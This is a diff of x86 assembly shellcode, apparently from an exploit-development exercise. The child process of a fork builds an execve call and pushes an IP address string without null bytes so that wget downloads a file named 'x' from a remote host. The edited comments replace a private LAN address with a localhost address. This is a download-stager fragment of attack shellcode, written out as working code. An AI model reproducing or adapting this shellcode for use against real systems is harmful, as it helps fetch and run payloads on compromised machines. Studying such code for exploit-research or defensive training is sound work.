@@ -50,13 +50,13 @@ _start:
     int 0x80
     
 child:
-    ;download 192.168.2.222//x with wget
+    ;download ip/x with wget
     push 0xb
     pop eax
     cdq
     push edx
     
-    ;push 0x782f2f31 ;1//x avoid null byte
+    ;push 0x782f2f31 ; we changed the IP for localhost 127.1.1.1 no null byte 
     push 0x782f2f31 ;22.2 ; x//1
     push 0x2e312e31 ;.861 ; .1.1
     push 0x2e373231 ;.721
